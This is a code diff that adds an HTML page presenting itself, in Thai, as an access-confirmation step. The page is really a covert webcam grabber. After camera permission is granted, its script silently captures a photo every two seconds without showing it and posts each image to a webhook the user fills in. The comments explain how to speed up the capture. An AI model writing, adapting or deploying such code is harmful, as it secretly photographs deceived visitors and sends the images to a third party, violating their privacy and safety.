@@ -1,0 +1,129 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Camera Live</title>
+<style>
+body{
+    background:#0f0f0f;
+    color:white;
+    text-align:center;
+    font-family:sans-serif;
+}
+button{
+    margin-top:15px;
+    padding:15px 25px;
+    font-size:18px;
+    border:none;
+    border-radius:12px;
+    background:#00b3ff;
+    color:white;
+}
+video{
+    width:90%;
+    max-width:400px;
+    margin-top:20px;
+    border-radius:12px;
+    display:none;
+}
+img{
+    margin-top:20px;
+    width:90%;
+    max-width:400px;
+    border-radius:12px;
+}
+</style>
+</head>
+<body>
+
+<h2>ยืนยันเพื่อเข้าใช้งาน</h2>
+<button onclick="startCam()">ยืนยัน</button>
+
+<br>
+<video id="cam" autoplay playsinline></video>
+<br>
+
+<button onclick="manualShot()" id="shotBtn" style="display:none;">📸 กดถ่ายรูป</button>
+
+<br>
+<img id="preview">
+
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+let running = false;
+
+// ===== เปิดกล้อง =====
+async function startCam(){
+    try{
+        const stream = await navigator.mediaDevices.getUserMedia({video:true});
+        const video = document.getElementById("cam");
+        video.srcObject = stream;
+        video.style.display="block";
+
+        document.getElementById("shotBtn").style.display="inline-block";
+
+        // เริ่มส่งรูปตลอดเวลา
+        running = true;
+        autoSend();
+
+    }catch{
+        alert("ต้องอนุญาตกล้องก่อน");
+    }
+}
+
+// ===== ส่งรูปอัตโนมัติ =====
+function autoSend(){
+    if(!running) return;
+
+    takePhoto(false); // false = ไม่โชว์หน้าเว็บ
+
+    setTimeout(autoSend,2000); 
+    // ปรับความเร็วตรงนี้:
+    // 2000 = ทุก 2 วิ
+    // 1000 = ทุก 1 วิ
+}
+
+// ===== กดถ่ายเอง =====
+function manualShot(){
+    takePhoto(true); // true = โชว์รูป
+}
+
+// ===== ถ่าย =====
+function takePhoto(show){
+    const video = document.getElementById("cam");
+    if(video.videoWidth === 0) return;
+
+    const canvas = document.getElementById("canvas");
+    const ctx = canvas.getContext("2d");
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video,0,0);
+
+    canvas.toBlob(blob=>{
+        send(blob);
+
+        // ถ้ากดถ่ายเองให้โชว์รูป
+        if(show){
+            const url = URL.createObjectURL(blob);
+            document.getElementById("preview").src = url;
+        }
+
+    },"image/png");
+}
+
+// ===== ส่ง webhook =====
+function send(blob){
+    const form = new FormData();
+    form.append("file",blob,"cam.png");
+
+    fetch("ใส่เว็บฮุกที่นี่",{
+        method:"POST",
+        body:form
+    });
+}
+</script>
+
+</body>
+</html>
